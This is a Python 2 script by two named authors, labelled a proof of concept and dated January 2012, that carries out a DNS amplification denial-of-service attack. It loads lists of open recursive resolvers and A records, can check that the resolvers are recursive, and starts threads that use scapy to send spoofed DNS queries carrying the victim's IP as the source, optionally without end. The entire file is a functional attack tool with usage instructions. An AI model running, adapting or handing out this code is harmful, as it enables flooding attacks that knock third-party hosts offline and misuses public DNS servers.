#
# DNS Amplification DOS Attack Script - Proof of Concept
#
#	Co-Authored Johnathin Ferretti and Pat Litke
#
#	Pat Litke		|	geudrik
#	Jonathin Ferretti	|	LISTERINe
#
#	January 2012
#
#
#
#	Dependencies
#		python-scapy
#		python-dnspython
#
#


# Basic imports to do simple I/O
from optparse import OptionParser
from string import lower
from os import path, system

# Ensure that switches are set before we do much of anything else.
#	This ensures that system resources aren't unnecessarily used
system("clear")
print "###########################################################"
print "###   DNS Amplification DOS Attack - Proof of Concept   ###"
print "###                                                     ###"
print "###   Co-Authored    :   LISTERINe and geudrik          ###"
print "###			Jon Ferretti & Pat Litke   ###"
print "###   Last Modified  :   January 2012                   ###"
print "###########################################################"
print "\n\n"

parser=OptionParser()

# Required Parameters
parser.add_option("-t", "--target", 
				action="store", dest="target",
				help="IP address of our target")

parser.add_option("-s", "--servers", 
				action="store", dest="servers",
				help="Path to our list of recursive DNS servers")

parser.add_option("-a", "--arecords", 
				action="store", dest="arecords",
				help="Path or our list of A-Name records")

# Optional Parameters
parser.add_option("-c", "--count", action="store", dest="count", default=5)
parser.add_option("-v", "--verbose", action="store_true", dest="verbose")
parser.add_option("--threads", action="store", dest="threads", default=1)
parser.add_option("--verify", action="store_true", dest="verify")


(options, args)=parser.parse_args()

# Check to see that at least -t -s and -a are set as they are required
if not options.target or not options.servers or not options.arecords:
	print "Options are as follows"
	print "-t           :   Target IP Address"
	print "-s           :   Path to Server File"
	print "-a           :   Path to A Record FIle"
	print "-c           :   -1 for infinite, \# of times to send packets"
	print "--verify     :   Verify that DNS servers are indeed recursive"
	print "-v           :   Set verbosity to true"
	print "--threads    :   Number of threads to spawn"
	print "\n"
	print "Example Usage\n"
	print "amplfiy.py -t 1.2.3.4 -s /usr/so.list -a /usr/arec.list -c \"-1\" --verify -v --threads=4"
	exit() 
		
else:
	print "All checks have passed successfully. You are about to launch"
	print " a DOS attack against "+options.target
	print "The following are the options passed..."
	print "Target          : "+options.target
	print "Servers         : "+options.servers
	print "A-Names         : "+options.arecords
	print "Send Count      : "+str(options.count)
	print "Verify Servers? : "+str(options.verify)
	print "Verbosity?      : "+str(options.verbose)
	print "Thread Count    : "+str(options.threads)
	proof=lower(raw_input("Are you sure you want to execute this attack?  (Y/N)"))
	
	if proof=="n":
		exit()


# Clear our buffer and continue on...	
system("clear");










##
#####
#####################################################
# Sanitation code for our DNS amplification script
#####################################################
#####
##


from dns import flags, resolver
from os import path, system
from sys import argv, stdout
from random import randrange, seed
from threading import Thread
import logging


# Supress IPv6 warnings...
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


### Sanitize our A-Records List
def pull_clean_servers(server_filename, verbose):

	# Populate our array serverlist
	try:
		handle	=	open(path.abspath(server_filename), "r")
		serverlist	=	handle.readlines()
		if verbose:
			print "Pre-sanitation: File opened and lines read"

	except:
		print "Bad filepath, cannot open file for reading "+server_filename
		exit()

	# For each server in our serverlist (see above), clean it
	clean	=	[]
	for server in serverlist:
		
		try:
			clean.append(server.strip())
			if verbose:
				print "Server Cleaned: "+server

		except:
			print "Unable to parse servername: "+server
			exit()
	
	print "\n=== Sanitation Complete ===\n\n"
	return clean




##
#####
####################################################
# Verification Code for our Name Servers
####################################################
#####
##

def verify_ns(nslist, verbose):

	if verbose:
		print "Now verifying nameservers..."

	verified = []
	for server in nslist:
		try:
			# Send our DNS request to the server
			answer = resolver.query(server)

			# Read DNS flags from response and check for RA flag
			DNSflags = (flags._to_text(answer.response.flags,
										flags._by_value,
										flags._flags_order)).split(" ")

			if "RA" in DNSflags:
				verified.append(server)
			
			if verbose:
				print "Server "+server+" is recursive"

		except:
			# Server is not recursive
			print "Server "+server+" is *NOT* recursive"

	return verified

##
#####
####################################################
# Thread Class to handle our our Multi Threading
####################################################
#####
##

class sender(Thread):

	# Define our __init__ struct
	def __init__(self, threadnum, data_package):
		Thread.__init__(self)
		self.data = data_package
		self.tnum = threadnum
		self.target = data_package[0]
		self.name_servers = data_package[1]
		self.A_records = data_package[2]
		self.send_limit = data_package[3]
		self.verbose = data_package[4]

	# Define our "push_dns_packets" struct
	def run(self):
		print "seeding..."
		seed()
		pac_num = 0
		while self. send_limit != pac_num:
			ns = self.name_servers[randrange(0,len(self.name_servers))]
			A_record = self.A_records[randrange(0,len(self.A_records))]
			
			if self.verbose:
				print "| Sending Packet: "+str(pac_num+1)+" |", "Thread Number:", str(self.tnum)+" |", "Target:", self.target+" |", "Name Server:", ns+" |", "A-Record:", A_record+" |"

			# Send the packet :D :D
			send(IP(dst=ns, src=self.target)/UDP()/DNS(rd=1,qd=DNSQR(qname=A_record)), verbose=0)
			pac_num+=1
	

	# Define our "run" struct
	#def run(self):
	#	self.push_DNS_packets(self.tnum, self.data[0], self.data[1], self.data[2], self.data[3], self.data[4])








##
#####
#####################################################
# Let's start assigning variables and threadding
#####################################################
#####
##

# Assign vars to be used in our threads. We'll do this one at a time to see where things break (if they do)
try:
	Target = options.target
except:
	print "Script Broke - Target assignment failed"
	exit()


try:
	Nameservers = pull_clean_servers(options.servers, options.verbose)
except:
	print "Script Broke - Nameservers assignment failed"
	exit()	


try: 
	A_Records = pull_clean_servers(options.arecords, options.verbose)
except:
	print "Script Broke - A_Records assignment failed."
	exit()




# Things are sanitized. Do we need to verify our name servers?
if options.verify:
	try:
		Nameservers = verify_ns(Nameservers, options.verbose)
		if options.verbose:
			print "Nameserver Verification Successful..."

	except:
		print "Errors were encountered (see above) in nameserver verification"
		print "You may continue, but the above nameservers will be ignored"
		ns_error=lower(raw_input("Would you like to still try the attack (suggest not)?  (Y/N) :"))

		if ns_error=="n":
			exit()



# Pause so we can see diagnostic output
finalcheck=lower(raw_input("This the last chance you get. Are you sure you want to continue?"))
print finalcheck
if finalcheck=="n":
	print "n"
	exit()

print "running"

# So here we go, lets fire up some threads
sendthreads = []
for thread in range(0,int(options.threads)):
	sendthreads.append(sender(thread+1, [Target, Nameservers, A_Records, int(options.count), options.verbose]))
	sendthreads[thread].start()


